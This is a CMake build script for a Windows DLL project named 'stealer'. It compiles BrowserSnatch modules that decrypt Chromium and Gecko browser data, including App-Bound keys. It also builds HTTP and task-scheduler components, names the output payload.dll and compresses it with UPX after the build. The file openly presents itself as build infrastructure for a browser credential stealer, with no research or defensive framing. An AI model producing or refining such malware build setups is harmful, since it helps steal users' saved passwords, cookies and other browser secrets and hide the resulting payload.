cmake_minimum_required(VERSION 3.19)
project(stealer LANGUAGES CXX C)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(BUILD_SHARED_LIBS OFF)

# ---- Local Dependencies (no FetchContent) ----
set(DEPS_DIR "${CMAKE_CURRENT_SOURCE_DIR}/.deps")

# SQLite3
add_subdirectory("${DEPS_DIR}/sqlite3-cmake" sqlite3-cmake EXCLUDE_FROM_ALL)

# pugixml
add_subdirectory("${DEPS_DIR}/pugixml" pugixml EXCLUDE_FROM_ALL)

# nlohmann/json - header-only, lives at libs/nlohmann/json.hpp
set(NLOHMANN_INCLUDE "${CMAKE_CURRENT_SOURCE_DIR}/../libs")

# ---- BrowserSnatch sources ----
set(BS_DIR "${CMAKE_CURRENT_SOURCE_DIR}/BrowserSnatch/BrowserSnatch")

set(BS_SOURCES
    ${BS_DIR}/Helper.cpp
    ${BS_DIR}/ChromiumDecryptor.cpp
    ${BS_DIR}/AppBoundDecryptor.cpp
    ${BS_DIR}/ChromiumParser.cpp
    ${BS_DIR}/AppBoundKeyParser.cpp
    ${BS_DIR}/DataDump.cpp
    ${BS_DIR}/GeckoDecryptor.cpp
    ${BS_DIR}/GeckoParser.cpp
    ${BS_DIR}/TaskService.cpp
)

# ---- Unified stealer sources ----
set(UNI_DIR "${CMAKE_CURRENT_SOURCE_DIR}/unified")

set(UNI_SOURCES
    ${UNI_DIR}/dllmain.cpp
    ${UNI_DIR}/http.cpp
)

# ---- DLL Target ----
add_library(stealer SHARED
    ${UNI_SOURCES}
    ${BS_SOURCES}
)

target_include_directories(stealer PRIVATE
    ${UNI_DIR}
    ${BS_DIR}
    ${BS_DIR}/includes
    ${NLOHMANN_INCLUDE}
)

# Precompiled header for unified sources only
target_precompile_headers(stealer PRIVATE "${UNI_DIR}/pch.hpp")
set_source_files_properties(${BS_SOURCES} PROPERTIES SKIP_PRECOMPILE_HEADERS ON)

target_compile_definitions(stealer PRIVATE
    "$<$<CONFIG:DEBUG>:DEBUG>"
    _CRT_SECURE_NO_WARNINGS
    _SILENCE_ALL_CXX17_DEPRECATION_WARNINGS
)
target_compile_options(stealer PRIVATE /W3 /utf-8 /GR-)

# Link deps + system libs
target_link_libraries(stealer PRIVATE
    SQLite3
    pugixml
    bcrypt
    crypt32
    winhttp
    ws2_32
    shell32
    advapi32
    iphlpapi
    shlwapi
    ntdll
    ole32
    oleaut32
    taskschd
    Wtsapi32
)

target_link_options(stealer PRIVATE /OPT:REF /OPT:ICF)

# Output as payload.dll
set_target_properties(stealer PROPERTIES
    OUTPUT_NAME "payload"
    SUFFIX ".dll"
)

# UPX compression post-build
set(UPX_EXE "${DEPS_DIR}/upx-4.2.4-win64/upx.exe")
if(EXISTS "${UPX_EXE}")
    add_custom_command(TARGET stealer POST_BUILD
        COMMAND "${UPX_EXE}" --best --lzma "$<TARGET_FILE:stealer>" -9q
    )
endif()
